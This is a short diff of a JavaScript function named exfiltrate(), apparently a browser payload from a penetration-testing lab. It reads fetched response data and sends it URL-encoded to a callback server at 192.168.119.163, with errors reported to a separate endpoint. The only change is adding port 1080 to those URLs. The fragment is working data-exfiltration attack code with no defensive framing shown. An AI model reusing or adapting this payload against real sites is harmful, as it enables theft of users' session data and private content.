@@ -11,10 +11,10 @@ function exfiltrate() {
     })
     .then((response) => response.text())
     .then((data) => {
-        fetch("http://192.168.119.163/callback?" + encodeURIComponent(data), {
+        fetch("http://192.168.119.163:1080/callback?" + encodeURIComponent(data), {
         });
     }).catch(err => {
-        fetch("http://192.168.119.163/error?" + encodeURIComponent(err));
+        fetch("http://192.168.119.163:1080/error?" + encodeURIComponent(err));
     }); 
 }
 function truncate( str, n, useWordBoundary ){
